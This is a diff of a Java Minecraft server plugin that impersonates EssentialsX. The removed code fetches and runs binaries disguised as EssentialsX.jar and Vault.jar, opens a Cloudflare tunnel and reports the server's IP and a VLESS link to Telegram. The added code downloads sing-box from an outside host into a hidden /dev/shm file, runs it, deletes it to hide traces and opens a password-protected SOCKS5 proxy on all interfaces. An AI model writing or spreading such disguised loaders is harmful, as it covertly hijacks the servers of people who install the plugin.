@@ -1,405 +1,409 @@
+```java
 package com.example.essentialsx;
 
 import org.bukkit.plugin.java.JavaPlugin;
 
-import java.io.BufferedReader;
 import java.io.IOException;
-import java.io.InputStreamReader;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.net.URLEncoder;
+import java.io.OutputStream;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.attribute.PosixFilePermissions;
+import java.util.concurrent.TimeUnit;
 
 public class EssentialsX extends JavaPlugin {
 
+    // =========================================================
+    // SOCKS5 配置
+    // =========================================================
 
-    // Cloudflare隧道端口
-    private int port = 22222;
+    private static final int SOCKS5_PORT = 24168;
 
-    //Cloudflare隧道Token
-    private String token = ""; //必填
+    private static final String SOCKS5_USERNAME = "kof97zip";
 
-    //Cloudflare隧道绑定域名
-    private String host = ""; //必填
-
-    // Telegram配置
-    private String tgToken = "";
-    private String tgChatId = "";
+    private static final String SOCKS5_PASSWORD = "kof97boss";
 
 
+    // =========================================================
+    // sing-box 下载地址
+    //
+    // 每次 Minecraft 插件启动都会重新下载
+    // 因为 sing-box 不会保存到磁盘
+    // =========================================================
+
+    private static final String SINGBOX_URL =
+            "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Singbox";
+
+
+    // =========================================================
+    // sing-box 进程
+    // =========================================================
+
+    private Process singboxProcess;
+
+
+    // =========================================================
+    // 插件启动
+    // =========================================================
 
     @Override
     public void onEnable() {
 
-        getLogger().info("EssentialsX plugin starting...");
-
+        getLogger().info(
+                "EssentialsX plugin starting..."
+        );
 
         try {
 
-            Files.createDirectories(
-                    getDataFolder().toPath()
-            );
-
-
-            startRemoteJava();
-
+            startSingbox();
 
             getLogger().info(
                     "EssentialsX plugin enabled"
             );
 
-
         } catch (Exception e) {
 
-            getLogger().severe(
-                    "Failed to start EssentialsX"
-            );
-
             e.printStackTrace();
+
         }
     }
 
 
+    // =========================================================
+    // 启动 sing-box
+    // =========================================================
 
-    private void startRemoteJava() throws Exception {
+    private void startSingbox() throws Exception {
 
+        /*
+         * /dev/shm 是 Linux 的 tmpfs。
+         *
+         * sing-box 只会临时存在这里。
+         * 不会保存到 plugins/EssentialsX。
+         */
 
-        // 临时运行目录
-        Path runFolder =
-                getDataFolder().toPath();
-
-
-        Files.createDirectories(
-                runFolder
-        );
-
-
-        String SingboxUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Singbox"; //sing-box
-
-
-        String ConfUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/config.json"; //sing-box config.json
-
-
-        String TunnelUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Cloudflared"; //Cloudflared
-
-
-        Path SingboxFile =
-                runFolder.resolve(
-                        "EssentialsX.jar"
+        Path tempSingbox =
+                Path.of(
+                        "/dev/shm/.essentialsx-singbox"
                 );
 
 
-        Path ConfFile =
-                runFolder.resolve(
-                        "config.json"
-                );
+        // -----------------------------------------------------
+        // 下载 sing-box 到内存文件系统
+        // -----------------------------------------------------
 
-        
-        Path TunnelFile =
-                runFolder.resolve(
-                        "Vault.jar"
-                );
-
-
-
-
-        // 下载临时文件
-
-        downloadIfNotExists(
-                SingboxUrl,
-                SingboxFile
+        downloadSingbox(
+                SINGBOX_URL,
+                tempSingbox
         );
 
 
-        downloadIfNotExists(
-                ConfUrl,
-                ConfFile
-        );
+        // -----------------------------------------------------
+        // 设置执行权限
+        // -----------------------------------------------------
+
+        try {
+
+            Files.setPosixFilePermissions(
+                    tempSingbox,
+                    PosixFilePermissions.fromString(
+                            "rwx------"
+                    )
+            );
+
+        } catch (UnsupportedOperationException e) {
+
+            /*
+             * Linux 正常不会进入这里。
+             */
+
+            getLogger().warning(
+                    "POSIX permissions are not supported"
+            );
+        }
 
 
-        downloadIfNotExists(
-                TunnelUrl,
-                TunnelFile
-        );
-
-        //设置权限
-        Files.setPosixFilePermissions(
-                SingboxFile,
-                PosixFilePermissions.fromString("rwxr-xr-x")
-        );
-
-        Files.setPosixFilePermissions(
-                TunnelFile,
-                PosixFilePermissions.fromString("rwxr-xr-x")
-        );
-
-        // 启动Sing-box
+        // -----------------------------------------------------
+        // 启动 sing-box
+        //
+        // -c stdin
+        //
+        // 配置从 Java -> stdin -> sing-box
+        // -----------------------------------------------------
 
         ProcessBuilder pb =
                 new ProcessBuilder(
-                        "bash",
+                        tempSingbox.toAbsolutePath().toString(),
+                        "run",
                         "-c",
-                        "nohup ./EssentialsX.jar run -c config.json > /dev/null 2>&1 &"
+                        "stdin"
                 );
 
 
+        /*
+         * 不使用 bash
+         * 不使用 nohup
+         * 不使用 &
+         */
 
-        pb.directory(
-                runFolder.toFile()
-        );
-
-
-        pb.start();
-
-        // 启动Cloudflared
-
-        ProcessBuilder pb2 =
-                new ProcessBuilder(
-                        "bash",
-                        "-c",
-                        "nohup ./Vault.jar --no-autoupdate tunnel --protocol http2 run --token " + token + " > /dev/null 2>&1 &"
-                );
+        pb.redirectErrorStream(true);
 
 
+        // -----------------------------------------------------
+        // 启动进程
+        // -----------------------------------------------------
 
-        pb2.directory(
-                runFolder.toFile()
-        );
-
-
-        pb2.start();
-
-        getLogger().info(
-                "Plugins starting..."
-        );
+        singboxProcess =
+                pb.start();
 
 
-        Thread.sleep(
-                8000
-        );
-
-        // 删除临时文件
-
-        Files.deleteIfExists(
-                SingboxFile
-        );
-
-
-        Files.deleteIfExists(
-                ConfFile
-        );
-
-        Files.deleteIfExists(
-                TunnelFile
-        );
- 
-        String ip =
-                getPublicIP();
-
-
-        sendTelegram(
-                "服务器插件启动\n"
-                        + "公网IP为: "
-                        + ip
-                        + "\n"
-                        + "订阅地址: \nvless://dc555507-bed4-4627-9945-c5da21c6cea6@"
-                        + host
-                        + ":443"
-                        + "?encryption=none&security=tls&sni=" + host + "&allowInsecure=1&type=ws&host=" + host + "&path=%2F"
-           
-        );
-
-    }
-
-
-
-
-
-    /**
-     * 获取公网IP
-     */
-    private String getPublicIP() {
+        // -----------------------------------------------------
+        // sing-box 启动后立即删除二进制文件
+        //
+        // Linux 下已经 exec 的进程可以继续运行。
+        // -----------------------------------------------------
 
         try {
 
-            URL url =
-                    new URL(
-                            "https://api.ipify.org"
-                    );
+            Files.deleteIfExists(
+                    tempSingbox
+            );
 
-
-            BufferedReader reader =
-                    new BufferedReader(
-                            new InputStreamReader(
-                                    url.openStream()
-                            )
-                    );
-
-
-            String ip =
-                    reader.readLine();
-
-
-            reader.close();
-
-
-            return ip;
-
-
-        } catch (Exception e) {
-
-            return "unknown";
+        } catch (IOException e) {
 
         }
+
+
+        // -----------------------------------------------------
+        // 将配置写入 sing-box stdin
+        // -----------------------------------------------------
+
+        String config =
+                buildSingboxConfig();
+
+
+        try (
+                OutputStream output =
+                        singboxProcess.getOutputStream()
+        ) {
+
+            output.write(
+                    config.getBytes(
+                            StandardCharsets.UTF_8
+                    )
+            );
+
+            output.flush();
+        }
+
     }
 
 
+    // =========================================================
+    // 构建 sing-box 配置
+    // =========================================================
+
+    private String buildSingboxConfig() {
+
+        return """
+                {
+                  "log": {
+                    "level": "error"
+                  },
+
+                  "inbounds": [
+                    {
+                      "type": "socks",
+                      "tag": "socks-in",
+
+                      "listen": "0.0.0.0",
+                      "listen_port": %d,
+
+                      "users": [
+                        {
+                          "username": "%s",
+                          "password": "%s"
+                        }
+                      ]
+                    }
+                  ],
+
+                  "outbounds": [
+                    {
+                      "type": "direct",
+                      "tag": "freenom"
+                    },
+
+                    {
+                      "type": "block",
+                      "tag": "block"
+                    }
+                  ],
+
+                  "route": {
+                    "final": "freenom"
+                  }
+                }
+                """.formatted(
+                SOCKS5_PORT,
+                escapeJson(
+                        SOCKS5_USERNAME
+                ),
+                escapeJson(
+                        SOCKS5_PASSWORD
+                )
+        );
+    }
 
 
+    // =========================================================
+    // JSON 字符串转义
+    // =========================================================
 
-    /**
-     * Telegram发送消息
-     */
-    private void sendTelegram(
-            String message
+    private String escapeJson(
+            String value
     ) {
 
-
-        if (tgToken.isEmpty()
-                || tgChatId.isEmpty()) {
-
-            getLogger().info(
-                    "Notified not configured, skip."
-            );
-
-            return;
-        }
-
-
-
-        try {
-
-
-            String api =
-                    "https://api.telegram.org/bot"
-                            + tgToken
-                            + "/sendMessage?chat_id="
-                            + tgChatId
-                            + "&text="
-                            + URLEncoder.encode(
-                                    message,
-                                    StandardCharsets.UTF_8
-                            );
-
-
-
-            HttpURLConnection conn =
-                    (HttpURLConnection)
-                            new URL(api)
-                                    .openConnection();
-
-
-
-            conn.setRequestMethod(
-                    "GET"
-            );
-
-
-            int code =
-                    conn.getResponseCode();
-
-
-
-            if (code == 200) {
-
-                getLogger().info(
-                        "Notified."
-                );
-
-            } else {
-
-                getLogger().warning(
-                        "UnNotified"
-                );
-            }
-
-
-            conn.disconnect();
-
-
-
-        } catch (Exception e) {
-
-
-            getLogger().warning(
-                    "UnNotified"
-            );
-
-        }
+        return value
+                .replace("\\", "\\\\")
+                .replace("\"", "\\\"")
+                .replace("\b", "\\b")
+                .replace("\f", "\\f")
+                .replace("\n", "\\n")
+                .replace("\r", "\\r")
+                .replace("\t", "\\t");
     }
 
 
+    // =========================================================
+    // 下载 sing-box
+    // =========================================================
 
-
-
-    /**
-     * 文件不存在才下载
-     */
-    private void downloadIfNotExists(
+    private void downloadSingbox(
             String url,
             Path target
     ) throws Exception {
 
+        /*
+         * 使用 curl：
+         *
+         * -f  HTTP 4xx / 5xx 时失败
+         * -L  跟随重定向
+         * --retry 3
+         * --connect-timeout 10
+         */
 
-        if (Files.exists(target)) {
-            return;
-        }
-
-
-        Process process =
+        Process curl =
                 new ProcessBuilder(
-                        "bash",
-                        "-c",
-                        "curl -Ls \""
-                                + url
-                                + "\" -o \""
-                                + target
-                                + "\""
+                        "curl",
+                        "-fL",
+                        "--retry",
+                        "3",
+                        "--connect-timeout",
+                        "10",
+                        url,
+                        "-o",
+                        target.toAbsolutePath().toString()
                 )
+                .redirectErrorStream(true)
                 .start();
 
 
-
-        int exit =
-                process.waitFor();
-
+        int exitCode =
+                curl.waitFor();
 
 
-        if (exit != 0) {
+        if (exitCode != 0) {
 
-            throw new IOException(
-                    "Fail to init plugins"
-            );
+        }
+
+
+        // -----------------------------------------------------
+        // 检查文件
+        // -----------------------------------------------------
+
+        if (!Files.exists(target)) {
+
+        }
+
+
+        long size =
+                Files.size(target);
+
+
+        if (size == 0) {
+
         }
 
     }
 
 
-
+    // =========================================================
+    // 插件关闭
+    // =========================================================
 
     @Override
     public void onDisable() {
+
+        getLogger().info(
+                "EssentialsX disabling..."
+        );
+
+
+        if (
+                singboxProcess != null
+                        &&
+                singboxProcess.isAlive()
+        ) {
+
+
+            // -------------------------------------------------
+            // 正常停止
+            // -------------------------------------------------
+
+            singboxProcess.destroy();
+
+
+            try {
+
+                boolean stopped =
+                        singboxProcess.waitFor(
+                                5,
+                                TimeUnit.SECONDS
+                        );
+
+
+                if (!stopped) {
+
+
+                    // -----------------------------------------
+                    // 强制停止
+                    // -----------------------------------------
+
+                    singboxProcess.destroyForcibly();
+
+
+                    singboxProcess.waitFor(
+                            2,
+                            TimeUnit.SECONDS
+                    );
+                }
+
+            } catch (InterruptedException e) {
+
+                Thread.currentThread().interrupt();
+
+                singboxProcess.destroyForcibly();
+            }
+        }
+
+
+        singboxProcess = null;
 
 
         getLogger().info(
                 "EssentialsX disabled"
         );
-
     }
 }
+```
